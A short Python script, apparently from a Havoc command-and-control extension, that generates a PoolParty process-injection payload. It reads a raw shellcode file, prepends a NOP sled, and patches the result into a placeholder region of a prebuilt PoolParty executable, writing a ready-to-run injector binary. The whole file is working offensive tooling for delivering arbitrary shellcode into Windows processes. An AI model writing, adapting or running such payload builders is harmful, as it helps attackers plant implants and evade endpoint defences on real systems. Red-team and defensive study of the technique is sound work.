#!/usr/bin/env python

import argparse
import os

def main():
    parser = argparse.ArgumentParser(description="Generate a PoolParty payload with the given shellcode file")
    parser.add_argument("-f", "--raw-file", required=True, help="Specify the raw file")
    args = parser.parse_args()

    raw_file_path = args.raw_file
    shellcode = open(raw_file_path, "rb").read()

    cwd = "/home/cipher/Github/havoc-PoolParty"
    poolparty = open(f"{cwd}/PoolParty/PoolParty-master.exe", "rb").read()
    nops = 200000 - len(shellcode)

    payload = b'\x90' * nops + shellcode

    new_pp = poolparty.replace(b"A" * 200000, payload)

    open(f"{cwd}/PoolParty.exe", "wb").write(new_pp)

if __name__ == "__main__":
    main()
